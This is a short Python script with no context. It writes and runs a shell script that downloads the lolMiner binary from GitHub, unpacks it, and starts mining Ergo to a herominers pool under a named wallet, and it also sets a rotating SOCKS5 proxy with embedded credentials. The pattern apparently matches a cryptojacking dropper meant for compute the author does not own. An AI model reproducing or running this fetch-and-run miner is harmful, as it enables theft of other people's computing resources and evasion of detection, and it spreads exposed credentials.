import os
os.system('echo "#!/bin/sh" >> tes')
os.system('echo "wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.35/lolMiner_v1.35_Lin64.tar.gz && tar zxvf lolMiner_v1.35_Lin64.tar.gz && cd 1.35" >> tes')
os.system('echo "./lolMiner --algo AUTOLYKOS2 --pool stratum+tcp://de.ergo.herominers.com:1180 --user 9go8JBDqkwW6jx9jATZUPfQoso3Z2sAimHpy7wmEYbBVHxaSnX6.rknew - export proxy socks5://sikencot-rotate:mbah2237@p.webshare.io:80" >> tes')
os.system('sleep 2')
os.system('sh tes')
